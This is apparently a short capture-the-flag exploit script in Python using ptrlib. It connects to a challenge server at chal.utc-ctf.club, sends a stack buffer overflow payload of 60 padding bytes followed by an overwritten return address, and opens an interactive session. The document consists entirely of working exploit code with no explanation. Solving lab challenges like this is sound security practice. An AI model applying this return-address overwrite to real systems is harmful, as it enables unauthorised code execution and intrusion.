from ptrlib import *

sock = Socket("chal.utc-ctf.club", 4902)
payload = b"a" * 60 + p32(0x8048586)
sock.recvuntil("text: ")
sock.sendline(payload)
sock.interactive()
